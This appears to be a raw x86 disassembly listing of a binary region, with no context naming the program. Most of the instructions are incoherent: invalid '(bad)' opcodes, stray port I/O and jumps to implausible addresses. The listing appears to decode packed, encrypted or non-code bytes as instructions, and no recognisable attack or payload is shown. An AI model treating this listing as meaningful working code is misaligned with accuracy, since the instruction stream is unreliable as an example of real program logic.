  430d84:	and    al,0x85
  430d86:	push   edx
  430d87:	add    BYTE PTR [eax+eax*1+0x0],ah
  430d8b:	dec    ebp
  430d8c:	mov    cl,0x23
  430d8e:	jmp    0x430d7c
  430d90:	mov    al,0xe7
  430d92:	call   0x1391080
  430d97:	shr    DWORD PTR [eax+ebx*2],cl
  430d9a:	lock (bad) 
  430d9c:	adc    eax,0x757f008d
  430da1:	out    0x58,eax
  430da3:	cmp    al,0x7
  430da5:	pop    edx
  430da6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430dad:	push   ecx
  430dae:	cld    
  430daf:	mov    esi,0x3b0175
  430db4:	and    al,0xb0
  430db6:	xor    BYTE PTR [edx+0x1],0x8b
  430dba:	add    ah,bh
  430dbc:	mov    edi,DWORD PTR [ebp-0x4]
  430dbf:	psubsw mm7,QWORD PTR [edi]
  430dc2:	add    DWORD PTR [ebp+0x0],ebp
  430dc5:	rcr    eax,1
  430dc7:	mov    edi,ecx
  430dc9:	and    eax,DWORD PTR [eax]
  430dcb:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430dd1:	call   0x13010ba
  430dd6:	add    al,cl
  430dd8:	mov    ebp,esi
  430dda:	aam    0x83
  430ddc:	or     DWORD PTR [ecx],eax
  430dde:	jne    0x430dd1
  430de0:	mov    eax,DWORD PTR [eax]
  430de2:	aam    0x0
  430de4:	dec    ebp
  430de5:	jne    0x430d72
  430de7:	cmp    ebx,eax
  430de9:	jb     0x430e38
  430deb:	jmp    0x430d78
  430ded:	mov    ebx,esp
  430def:	int3   
  430df0:	dec    ebp
  430df1:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430df8:	mov    edx,0x8b0a8b
  430dfd:	cmp    ecx,DWORD PTR [eax]
  430dff:	jb     0x430dd8
  430e01:	pop    edx
  430e02:	push   edi
  430e03:	cli    
  430e04:	pop    es
  430e05:	mov    eax,ecx
  430e07:	jb     0x430e0b
  430e09:	add    DWORD PTR [ebx],0xa
  430e0c:	mov    eax,DWORD PTR [ebx]
  430e0e:	int3   
  430e0f:	add    bh,BYTE PTR [esi+0x75d10006]
  430e15:	jmp    0x430da2
  430e17:	mov    al,0xe8
  430e19:	call   0x104109b
  430e1e:	add    edx,DWORD PTR [ecx+ecx*8]
  430e21:	pop    edi
  430e22:	or     BYTE PTR [ecx-0x73],bl
  430e25:	pop    ecx
  430e26:	inc    edi
  430e27:	xor    al,0xeb
  430e29:	push   ecx
  430e2a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430e30:	call   0xb20f35
  430e35:	int3   
  430e36:	sbb    BYTE PTR [esi],ch
  430e38:	inc    ebp
  430e39:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430e3f:	call   0x9c10ae
  430e44:	or     BYTE PTR [ebx-0x73],dl
  430e47:	cmp    al,0x47
  430e49:	mov    al,0x1
  430e4b:	jb     0x430e4d
  430e4d:	mov    al,0x10
  430e4f:	push   eax
  430e50:	add    al,0x75
  430e52:	add    BYTE PTR [ebx],ch
  430e54:	add    ebx,esp
  430e56:	int3   
  430e57:	jne    0x430e69
  430e59:	movsx  edx,cl
  430e5c:	add    DWORD PTR [eax],eax
  430e5e:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430e65:	mov    gs,edi
  430e67:	add    BYTE PTR [eax-0x50],ch
  430e6a:	add    al,ch
  430e6c:	mov    eax,DWORD PTR [ecx]
  430e6e:	sub    eax,DWORD PTR [eax]
  430e70:	jb     0x430ee7
  430e72:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430e76:	jge    0x430e60
  430e78:	add    al,0x1
  430e7a:	add    DWORD PTR [eax],0x0
  430e7d:	jne    0x430e7f
  430e7f:	je     0x430ec6
  430e81:	mov    eax,DWORD PTR [edi]
  430e83:	ror    BYTE PTR [ebp+0x4d],1
  430e86:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430e8d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430e93:	mov    DWORD PTR [ebx],ebp
  430e95:	fadd   DWORD PTR [eax+0x75]
  430e98:	inc    eax
  430e99:	pop    eax
  430e9a:	lea    ebx,[ecx+0x4f]
  430e9d:	push   0xb1000003
  430ea2:	out    dx,eax
  430ea3:	add    ebp,DWORD PTR [edx+edx*2]
  430ea6:	add    BYTE PTR [ebx+ecx*4],bh
  430ea9:	mov    ch,BYTE PTR [ebx]
  430eab:	jb     0x430f1f
  430ead:	add    al,0x89
  430eaf:	push   eax
  430eb0:	call   0x842b5c22
  430eb5:	add    DWORD PTR [eax+eax*1],eax
  430eb8:	jae    0x430ece
  430eba:	icebp  
  430ebb:	inc    ebp
  430ebc:	mov    eax,DWORD PTR gs:[ecx]
  430ebf:	int3   
  430ec0:	out    dx,al
  430ec1:	loopne 0x430f10
  430ec3:	sub    eax,DWORD PTR [edx]
  430ec5:	push   0xffffff83
  430ec7:	pop    esi
  430ec8:	push   cs
  430ec9:	jl     0x430ee4
  430ecb:	add    al,0xaf
  430ecd:	xor    eax,0x832b6d00
  430ed2:	mov    eax,DWORD PTR [edx]
  430ed4:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430eda:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ee0:	inc    ebp
  430ee1:	shr    ebx,0x3
  430ee4:	or     DWORD PTR [eax],0x4
  430ee7:	push   0xffffffa5
  430ee9:	pop    esi
  430eea:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430ef1:	jmp    0x430f50
  430ef3:	mov    edi,0xff0272
  430ef8:	fdivr  QWORD PTR [ebp+0x5d]
  430efb:	push   0x4e
  430efd:	pop    ecx
  430efe:	call   0x435303
  430f03:	mov    DWORD PTR [ebx],eax
  430f05:	in     al,0xc8
  430f07:	rol    BYTE PTR [ebp-0x75],0xc1
  430f0b:	call   0xad10ec
  430f10:	pop    esi
  430f11:	enter  0xceff,0x8b
  430f15:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f19:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430f20:	je     0x430f22
  430f22:	or     DWORD PTR [ebx-0x74183b24],eax
  430f28:	jne    0x430f0e
  430f2a:	jmp    0x430f25
  430f2c:	push   DWORD PTR [edx-0x24]
  430f2f:	push   0x4d
  430f31:	pop    ecx
  430f32:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430f36:	jge    0x430f3e
  430f38:	mov    eax,eax
  430f3a:	sub    ebp,DWORD PTR [edx+0x24]
  430f3d:	pop    esi
  430f3e:	inc    ebp
  430f3f:	mov    esp,0x8b6077
  430f44:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430f4a:	lods   al,BYTE PTR ds:[esi]
  430f4b:	add    BYTE PTR [ebx],bh
  430f4d:	enter  0xce73,0x49
  430f51:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430f59:	stc    
  430f5a:	jge    0x430fce
  430f5c:	jnp    0xdd4292cb
  430f62:	call   0xc61038
  430f67:	fadd   st(0),st
  430f69:	dec    esi
  430f6a:	ins    BYTE PTR es:[edi],dx
  430f6b:	stc    
  430f6c:	cmp    al,0x73
  430f6e:	push   ebp
  430f6f:	mov    eax,0xf8028b
  430f74:	jne    0x430f37
  430f76:	mov    esi,ecx
  430f78:	mov    esp,DWORD PTR [ebp+0x2c]
  430f7b:	add    edi,DWORD PTR [ebp-0x24]
  430f7e:	sub    esp,eax
  430f80:	and    al,0x45
  430f82:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430f88:	sbb    al,0xee
  430f8a:	pop    esi
  430f8b:	call   0x830fbb
  430f90:	fsubr  st,st(3)
  430f92:	sti    
  430f93:	add    BYTE PTR gs:[ecx],bh
  430f96:	add    eax,esp
  430f98:	add    DWORD PTR [esi],eax
  430f9a:	rol    DWORD PTR [ebp+0x8],0x29
  430f9e:	mov    esp,eax
  430fa0:	clc    
  430fa1:	jne    0x431018
  430fa3:	mov    eax,0x8b0673
  430fa8:	loopne 0x430fef
  430faa:	loopne 0x430f35
  430fac:	lods   al,BYTE PTR ds:[esi]
  430fad:	int3   
  430fae:	inc    ebp
  430faf:	mov    DWORD PTR gs:[eax+edi*8],eax
  430fb3:	add    al,0xc3
  430fb5:	sub    ecx,DWORD PTR [ebp+0x47]
  430fb8:	(bad)  
  430fba:	shr    BYTE PTR [ebp-0x1f],0xe8
  430fbe:	add    eax,DWORD PTR [eax]
  430fc0:	call   0x644d0c5
  430fc5:	add    esi,DWORD PTR [esi-0x3b2efc83]
  430fcb:	dec    esi
  430fcc:	ins    DWORD PTR es:[edi],dx
  430fcd:	in     al,dx
  430fce:	lea    eax,[eax]
  430fd0:	inc    ebp
  430fd1:	inc    ebp
  430fd2:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  430fd8:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  430fe2:	and    al,0xdc
  430fe4:	ror    DWORD PTR [edx+0x24],0xf7
  430fe8:	or     BYTE PTR [ebp+0x4c],dh
  430feb:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  430fef:	stos   BYTE PTR es:[edi],al
  430ff0:	adc    edx,edi
  430ff2:	inc    esp
  430ff3:	add    edi,DWORD PTR [eax]
  430ff5:	jne    0x430fda
  430ff7:	mov    DWORD PTR [eax-0x7449db04],ecx
  430ffd:	cmp    ecx,DWORD PTR [edi]
  430fff:	sub    BYTE PTR [ebp-0x7e],dl
  431002:	sar    ebp,0xb
  431005:	jmp    FWORD PTR [edi+0x2400392a]
  43100b:	sub    esi,DWORD PTR [ebx-0x73]
  43100e:	mov    esp,DWORD PTR [ecx+edi*4]
  431011:	mov    ecx,DWORD PTR [eax]
  431013:	and    BYTE PTR [eax],al
  431015:	jne    0x430fe1
  431017:	sub    ebp,ecx
  431019:	sbb    BYTE PTR [esi+0x32],ah
  43101c:	dec    ebp
  43101d:	push   ebp
  43101e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431024:	ret    
  431025:	mov    edx,ebp
  431027:	leave  
  431028:	sub    DWORD PTR [esi+0x24],ebx
  43102b:	ret    0x2b
  43102e:	pop    ax
  431030:	push   ebp
  431031:	rol    BYTE PTR [ebx],0xeb
  431034:	add    DWORD PTR [ecx+0x6c0001],0x40
  43103b:	jb     0x431092
  43103d:	ret    
  43103e:	in     al,dx
  43103f:	jecxz  0x430fcc
  431041:	push   esi
  431042:	xchg   esp,eax
  431043:	jne    0x431045
  431045:	cmp    edx,DWORD PTR [esi+0x1c]
  431048:	jne    0x43102e
  43104a:	mov    eax,DWORD PTR [ebp-0x77]
  43104d:	ror    DWORD PTR [ebx+0x899408],0xe0
  431054:	mov    esi,DWORD PTR [ebp-0x75]
  431057:	pop    esi
  431058:	nop
  431059:	mov    eax,DWORD PTR [eax]
  43105b:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431061:	add    al,0x0
  431063:	inc    ebp
  431064:	mov    eax,DWORD PTR [ebx]
  431066:	mov    ebp,ebx
  431068:	cmp    al,0xf
  43106a:	or     al,al
  43106c:	inc    ebp
  43106d:	inc    ebp
  43106e:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431074:	cld    
  431075:	add    BYTE PTR [edi+0x546c16c0],dh
  43107b:	add    BYTE PTR [ecx-0x5],dl
  43107e:	add    eax,0x17200
  431083:	sbb    al,0x85
  431085:	dec    esp
  431086:	je     0x4310c0
  431088:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43108c:	add    BYTE PTR [ebx],bh
  43108e:	(bad)  
  43108f:	and    al,0x32
  431091:	jae    0x43102f
  431093:	mov    cl,cl
  431095:	inc    DWORD PTR [esp]
  431098:	push   ebp
  431099:	shr    esp,0x8
  43109c:	in     al,dx
  43109d:	push   esp
  43109e:	add    DWORD PTR [eax],esp
  4310a0:	add    bl,cl
  4310a2:	inc    ebp
  4310a3:	mov    bh,0x89
  4310a5:	add    ah,bh
  4310a7:	jmp    0xca751ff1
  4310ac:	pushf  
  4310ad:	dec    esp
  4310ae:	mov    edx,0xf8178520
  4310b3:	fst    DWORD PTR [ebp+0x0]
  4310b6:	mov    BYTE PTR [eax],0xc4
  4310b9:	sub    edx,DWORD PTR [ebx-0x3f]
  4310bc:	inc    ebp
  4310bd:	add    eax,0xc601da
  4310c2:	mov    al,0xc6
  4310c5:	ins    BYTE PTR es:[edi],dx
  4310c6:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4310cd:	dec    esp
  4310ce:	jmp    DWORD PTR [eax]
  4310d0:	inc    ebp
  4310d1:	fnstcw WORD PTR [esi+0x29]
  4310d4:	test   BYTE PTR [eax],0xc8
  4310d7:	rol    BYTE PTR [eax],0xc0
  4310da:	lea    ecx,[ebp-0x3cf0dbcb]
  4310e0:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4310e6:	inc    esi
  4310e7:	add    DWORD PTR [eax],ebx
  4310e9:	add    dh,bh
  4310eb:	mov    esi,DWORD PTR [edx+0x8]
  4310ee:	(bad)  
  4310ef:	fdiv   QWORD PTR ss:[ecx]
  4310f2:	(bad)  
  4310f3:	mov    bl,ch
  4310f5:	add    esi,eax
  4310f7:	add    dh,bl
  4310f9:	or     esi,eax
  4310fb:	mov    dl,0xdf
  4310fd:	add    esi,eax
  4310ff:	add    al,ah
  431101:	push   cs
  431102:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431109:	or     BYTE PTR [ebx],dh
  43110b:	dec    ecx
  43110c:	lea    eax,[ebx]
  43110e:	xor    eax,0x18fc0fc7
  431113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431114:	repz clc 
  431116:	add    eax,DWORD PTR [ebp+0x46]
  431119:	prefetcht0 BYTE PTR [ecx-0x2]
  43111d:	xor    eax,0x7c60872
  431122:	mov    esp,0xbd32c69b
  431127:	pop    esi
  431128:	mov    cl,0xbe
  43112b:	or     al,0xc6
  43112d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431134:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43113b:	add    dh,al
  43113d:	mov    eax,ebx
  43113f:	xor    DWORD PTR [ebx],0x35008dbc
  431145:	mov    ecx,DWORD PTR [edi]
  431147:	sbb    al,0x18
  431149:	inc    ebp
  43114a:	xrelease mov DWORD PTR [ebx],0x188546f4
  431151:	clc    
  431152:	(bad)  
  431153:	xor    DWORD PTR [edx-0x64],esi
  431156:	lea    ecx,[ecx+0x45ffe838]
  43115c:	mov    ecx,ebx
  43115e:	fadd   st,st(6)
  431160:	dec    ebp
  431161:	lds    edi,FWORD PTR [eax+0x7145fc56]
  431167:	out    0x1,eax
  431169:	inc    ebp
  43116a:	lea    ebp,ds:0xc8ffc6ff
  431170:	enter  0xa33,0xc6
  431174:	push   ebp
  431175:	leave  
  431176:	(bad)  
  431177:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43117d:	add    BYTE PTR [ebp+0x44],al
  431180:	mov    eax,esp
  431182:	mov    WORD PTR [esi+0x46398300],?
  431188:	psubusw mm4,QWORD PTR [esi-0x78]
  43118c:	add    BYTE PTR [ebx-0x1303f975],al
  431192:	add    BYTE PTR [ebp+0x1],0xeb
  431196:	add    BYTE PTR [ebp+0x38],al
  431199:	in     eax,dx
  43119a:	inc    ebp
  43119b:	inc    ebp
  43119c:	mov    ebx,ebx
  43119e:	add    BYTE PTR [ebp+0x0],0xec
  4311a2:	mov    DWORD PTR [ebp-0x41],eax
  4311a5:	sub    eax,0x2c00454e
  4311aa:	ins    DWORD PTR es:[edi],dx
  4311ab:	inc    ebp
  4311ac:	add    BYTE PTR [esi+0x66],bh
  4311af:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4311b6:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4311c0:	dec    edi
  4311c1:	pop    es
  4311c2:	add    ah,ch
  4311c4:	mov    DWORD PTR [ebp+0x68],eax
  4311c7:	in     eax,dx
  4311c8:	inc    DWORD PTR [ebp-0x7d]
  4311cb:	out    0xc0,al
  4311cd:	inc    ebp
  4311ce:	mov    edx,esp
  4311d0:	push   0x45
  4311d2:	(bad)  
  4311d3:	jmp    0xdf925790
  4311d8:	add    BYTE PTR [ebp-0x77],al
  4311db:	out    dx,al
  4311dc:	ins    BYTE PTR es:[edi],dx
  4311dd:	inc    ebp
  4311de:	jmp    edi
  4311e0:	add    DWORD PTR [ebp-0x14],0x7e
  4311e4:	mov    esi,esi
  4311e6:	outs   dx,BYTE PTR ds:[esi]
  4311e7:	inc    esp
  4311e8:	(bad)  
  4311e9:	mov    esp,0x8341b68d
  4311ee:	mov    DWORD PTR [esi+0x70],eax
  4311f1:	fcos   
  4311f3:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  4311f9:	in     al,dx
  4311fa:	jb     0x431181
  4311fc:	(bad)  
  4311fd:	dec    DWORD PTR [ebx-0x7aba9901]
  431203:	mov    edi,edi
  431205:	fdivr  st,st(7)
  431207:	out    dx,eax
  431208:	rcl    BYTE PTR [ebx],0x66
  43120b:	mov    DWORD PTR [ebp-0xc70075],eax
  431211:	(bad)  
  431212:	std    
  431213:	cmp    eax,DWORD PTR [eax]
  431215:	jne    0x43127d
  431217:	mov    DWORD PTR [ebp-0xba0048],eax
  43121d:	in     al,dx
  43121e:	outs   dx,BYTE PTR ds:[esi]
  43121f:	pushf  
  431220:	add    BYTE PTR [ebx-0x7f7a039a],cl
  431226:	inc    DWORD PTR [ecx]
  431228:	inc    DWORD PTR [eax]
  43122a:	jae    0x431264
  43122c:	add    BYTE PTR [ebp+0x850266],al
  431232:	inc    DWORD PTR [ebp-0x1]
  431235:	mov    eax,eax
  431237:	jl     0x43129f
  431239:	add    BYTE PTR [ebp-0x740077],al
  43123f:	cld    
  431240:	dec    eax
  431241:	add    BYTE PTR [eax],0x1
  431244:	data16 add BYTE PTR [ebp+0x38],al
  431248:	mov    eax,0x47c2
  43124d:	mov    eax,0x824f89
  431252:	inc    edi
  431253:	mov    DWORD PTR [edx+0x64],ebp
  431256:	inc    WORD PTR [ebp-0x75]
  43125a:	(bad)  
  43125b:	data16 rol BYTE PTR [ebp-0x16001a],1
  431262:	inc    ebp
  431263:	jge    0x431244
  431265:	add    bh,ah
  431267:	lea    ax,[ebp-0x750030]
  43126e:	add    al,0x46
  431271:	jmp    0x40ff:0x8885
  431277:	push   DWORD PTR [ebp+0x52]
  43127a:	lea    eax,[eax]
  43127c:	shl    BYTE PTR [esi-0x7b],1
  43127f:	test   esi,edi
  431281:	(bad)  
  431282:	(bad)  
  431283:	inc    DWORD PTR [ebp-0x990140]
  431289:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43128f:	inc    edi
  431290:	push   ecx
  431291:	xor    ax,WORD PTR [ebp-0x8d0045]
  431298:	add    al,al
  43129a:	ret    
  43129b:	mov    ax,WORD PTR [ebp-0x3f0004]
  4312a2:	push   eax
  4312a3:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4312aa:	add    BYTE PTR [ebx-0x764f8839],al
  4312b0:	push   DWORD PTR [esi+0x1]
  4312b3:	inc    DWORD PTR [eax]
  4312b5:	mov    eax,0xff99ff
  4312ba:	or     BYTE PTR [ecx-0x7a87bb],cl
  4312c0:	jne    0x43127a
  4312c2:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4312cc:	mov    ecx,0xd74fb8
  4312d1:	add    cl,al
  4312d3:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4312d9:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4312e0:	(bad)  
  4312e1:	push   ebp
  4312e3:	mov    eax,0x8c2789
  4312e8:	ret    0x6689
  4312eb:	adc    BYTE PTR [ebp+0x48],0x8d
  4312ef:	add    bh,ah
  4312f1:	mov    WORD PTR [ebp-0x70],ax
  4312f5:	(bad)  
  4312f6:	ret    0x667d
  4312f9:	or     BYTE PTR [ebp-0x77],dl
  4312fc:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431303:	loop   0x43128e
  431305:	(bad)  
  431306:	xchg   esi,eax
  431307:	aam    0xcf
  431309:	out    dx,al
  43130a:	mov    DWORD PTR [esi-0x68],edi
  43130d:	inc    ebp
  43130e:	dec    edx
  43130f:	pop    ecx
  431310:	mov    edx,DWORD PTR [eax]
  431312:	repnz push bp
  431315:	or     BYTE PTR [ebx+0x55106638],0x49
  43131c:	(bad)  
  43131d:	repnz xor eax,0xa0898945
  431323:	mov    ah,0x89
  431325:	jmp    DWORD PTR [edx+0x66b0418d]
  43132b:	inc    DWORD PTR [ebp+0x50]
  43132e:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431332:	mov    DWORD PTR [eax],ecx
  431334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431335:	pop    es
  431336:	inc    ecx
  431337:	(bad)  
  431338:	data16 fwait
  43133a:	inc    ebp
  43133b:	xor    ah,BYTE PTR [esi+0x3]
  43133e:	dec    ebp
  43133f:	push   eax
  431340:	inc    bp
  431342:	jge    0x4312c7
  431344:	mov    esp,DWORD PTR [esi-0x18]
  431347:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  43134d:	add    DWORD PTR [ebx],esi
  43134f:	add    BYTE PTR [ebx],al
  431351:	test   DWORD PTR [ebx],esi
  431353:	(bad)  
  431354:	inc    WORD PTR [ebp+0x0]
  431358:	mov    eax,DWORD PTR [eax]
  43135a:	call   0x8898ca8f
  43135f:	mov    esi,eax
  431361:	clc    
  431362:	ret    
  431363:	rol    cl,0xa
  431366:	mov    DWORD PTR ds:0x7c0ec88,esi
  43136c:	mov    edx,edi
  43136e:	pushf  
  43136f:	pop    es
  431370:	jmp    FWORD PTR [edx+0x66]
  431373:	add    BYTE PTR [ebp-0x990175],al
  431379:	inc    ebp
  43137a:	test   DWORD PTR [ebx-0x2f00f202],eax
  431380:	push   ebp
  431381:	mov    edi,eax
  431383:	mov    dh,BYTE PTR [eax+0x266ff51]
  431389:	push   ebp
  43138a:	add    BYTE PTR [ebx-0x764b0777],al
  431390:	dec    DWORD PTR [esi+0x661851e8]
  431396:	add    BYTE PTR [ebp-0x7b],dl
  431399:	cmp    esi,0xfffffffb
  43139c:	dec    DWORD PTR [ecx+0x51fe9285]
  4313a2:	jmp    DWORD PTR [esi-0x75]
  4313a5:	push   ebp
  4313a6:	hlt    
  4313a7:	data16 (bad) 
  4313a9:	dec    ebp
  4313aa:	ret    
  4313ab:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4313b1:	lea    edx,[eax-0x1]
  4313b4:	jne    0x431387
  4313b6:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4313bc:	dec    BYTE PTR [ecx+0x51559eff]
  4313c2:	mov    DWORD PTR [esi-0x4c],esp
  4313c5:	push   ebp
  4313c6:	jmp    DWORD PTR [esi-0x18]
  4313c9:	inc    ebp
  4313ca:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4313d0:	(bad)  
  4313d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4313d2:	inc    eax
  4313d4:	test   DWORD PTR [esi-0x2],esp
  4313d7:	inc    ebp
  4313d8:	dec    DWORD PTR [ebp-0x760bde75]
  4313de:	(bad)  
  4313df:	test   al,0xc3
  4313e1:	mov    DWORD PTR [ebp-0x769b56],ecx
  4313e7:	lods   al,BYTE PTR ds:[esi]
  4313e8:	push   eax
  4313e9:	inc    ebp
  4313ea:	jne    0x4313fb
  4313ec:	dec    DWORD PTR [ebp+0x8]
  4313ef:	mov    ecx,DWORD PTR [ebx]
  4313f1:	sbb    al,0x0
  4313f3:	(bad)  
  4313f4:	mov    eax,0xc14fc3
  4313f9:	mov    DWORD PTR [ecx-0xbabf64],ecx
  4313ff:	movsx  ecx,WORD PTR [ebp+0x4e]
  431403:	xor    eax,DWORD PTR [eax]
  431405:	add    eax,edi
  431407:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43140d:	xor    edi,DWORD PTR [eax+0x854f66]
  431413:	dec    BYTE PTR [ecx-0x76bb01]
  431419:	mov    BYTE PTR [ebx-0x76724001],al
  43141f:	pushf  
  431420:	inc    esi
  431421:	(bad)  
  431422:	dec    DWORD PTR [ebp-0x7abe6373]
  431428:	sar    esi,0x89
  43142b:	dec    DWORD PTR [eax+0x0]
  43142e:	inc    DWORD PTR [eax]
  431430:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  431437:	xlat   BYTE PTR ds:[ebx]
  431438:	dec    edx
  431439:	add    bh,bh
  43143b:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431441:	lea    esp,[esi-0x50]
  431444:	(bad)  
  431445:	(bad)  
  431446:	call   DWORD PTR [eax-0x1]
  431449:	inc    ebp
  43144a:	rdpmc  
  43144c:	add    BYTE PTR [ebx],al
  43144e:	push   ax
  431450:	lea    eax,[ebp-0x1]
  431456:	js     0x431457
  431458:	add    al,bh
  43145a:	push   bp
  43145c:	lea    ecx,[ebp-0x7701]
  431462:	fmul   DWORD PTR [ebp-0x7a997800]
  431468:	(bad)  
  431469:	(bad)  
  43146a:	(bad)  
  43146b:	(bad)  
  43146c:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431472:	dec    eax
  431473:	mov    eax,0x8d8dffff
  431478:	mov    al,0xb0
  43147a:	(bad)  
  43147b:	call   DWORD PTR [ecx+0x50]
  43147e:	dec    ebp
  43147f:	inc    ebp
  431480:	mov    esi,0x7030833
  431485:	push   eax
  431486:	into   
  431487:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43148d:	call   DWORD PTR [ecx-0x8]
  431490:	lea    edx,[ebp-0x1]
  431493:	jmp    0x761697
  431498:	inc    eax
  431499:	jnp    0x431428
  43149b:	add    dh,bh
  43149d:	inc    WORD PTR [ebp-0x8a00b0]
  4314a4:	mov    edx,eax
  4314a6:	inc    esp
  4314a7:	add    bh,bh
  4314a9:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4314af:	dec    DWORD PTR [ebx-0x7f820301]
  4314b5:	add    BYTE PTR [ecx],al
  4314b7:	data16 add BYTE PTR [ebp-0xb30077],al
  4314be:	inc    eax
  4314c0:	(bad)  
  4314c1:	dec    si
  4314c3:	test   edi,edi
  4314c5:	(bad)  
  4314c6:	cmp    edi,edi
  4314c8:	add    ecx,DWORD PTR [edi-0x39]
  4314cb:	mov    edx,DWORD PTR [edx+0x66]
  4314ce:	inc    DWORD PTR [ebp-0x3d00cb]
  4314d4:	mov    eax,0x66ff8b5e
  4314da:	jmp    0xb4ff:0xc7ff3895
  4314e1:	push   ecx
  4314e2:	inc    DWORD PTR [ebx-0x76ffccbb]
  4314e8:	call   DWORD PTR [esi-0x1]
  4314eb:	dec    DWORD PTR [eax]
  4314ed:	mov    ecx,0x805ff
  4314f2:	inc    ebp
  4314f3:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  4314f9:	mov    ecx,0x35784
  4314fe:	add    BYTE PTR [ecx-0xffa59b],cl
  431504:	inc    ebp
  431505:	mov    ecx,0x9c6131
  43150a:	(bad)  
  43150b:	mov    eax,ebx
  43150d:	pop    esp
  43150e:	test   edi,edi
  431510:	clc    
  431511:	lea    eax,[ebp-0x24]
  431514:	cmp    eax,0xc7fe9c8d
  431519:	push   eax
  43151b:	lea    eax,[ebp+0x45fff8fe]
  431521:	mov    esi,DWORD PTR [ecx]
  431523:	hlt    
  431524:	lahf   
  431525:	push   esp
  431526:	mov    edx,DWORD PTR [ecx-0x4]
  431529:	xor    eax,DWORD PTR [eax+0x7201bb]
  43152f:	add    BYTE PTR [ebp-0x35],al
  431532:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  431538:	mov    edx,DWORD PTR [ecx-0x74]
  43153b:	rol    BYTE PTR [eax],0x8d
  43153e:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431542:	nop
  431543:	push   ecx
  431544:	add    bh,bh
  431546:	mov    esp,edi
  431548:	in     al,0x85
  43154a:	jge    0x43154a
  43154c:	test   edi,edi
  43154e:	jne    0x4314d5
  431550:	(bad)  
  431551:	(bad)  
  431552:	sbb    bh,bh
  431554:	push   ebp
  431555:	inc    ebp
  431556:	call   0xffdc0fe6
  43155b:	add    BYTE PTR [ebp+0x66],al
  43155e:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431564:	cmp    al,0x85
  431566:	ud0    eax,DWORD PTR [ebp-0x1]
  43156a:	test   DWORD PTR [edi+0x74],ecx
  43156d:	dec    edi
  43156e:	inc    DWORD PTR [ebp-0x530004]
  431574:	dec    DWORD PTR [edi-0x75]
  431577:	dec    esi
  431578:	cld    
  431579:	test   DWORD PTR [eax+0xff01ff],eax
  43157f:	icebp  
  431580:	add    BYTE PTR [edi-0x3a],cl
  431583:	test   ebx,eax
  431585:	inc    BYTE PTR [ebp-0x1]
  431588:	jne    0x43158a
  43158a:	mov    eax,DWORD PTR [eax]
  43158c:	cld    
  43158d:	xor    BYTE PTR [ecx+0x500155],cl
  431593:	push   ebp
  431594:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43159a:	add    BYTE PTR [ebp+0x35e90f50],al
  4315a0:	add    al,BYTE PTR [eax]
  4315a2:	add    BYTE PTR [ebx-0x38fe4f80],al
  4315a8:	add    ah,ch
  4315aa:	or     BYTE PTR [ebp+0x4501f845],dh
  4315b0:	jmp    0xdf18a6
  4315b5:	(bad)  
  4315b6:	nop    ecx
  4315b9:	test   DWORD PTR [ebp+0x4502f8],eax
  4315bf:	xor    ecx,DWORD PTR [ebp-0x64]
  4315c2:	mov    eax,edi
  4315c4:	mov    ebx,DWORD PTR [eax+edx*2]
  4315c7:	add    eax,0x45fef885
  4315cc:	dec    DWORD PTR [ebx+0x339445]
  4315d2:	add    ecx,DWORD PTR [ecx+0x4500f889]
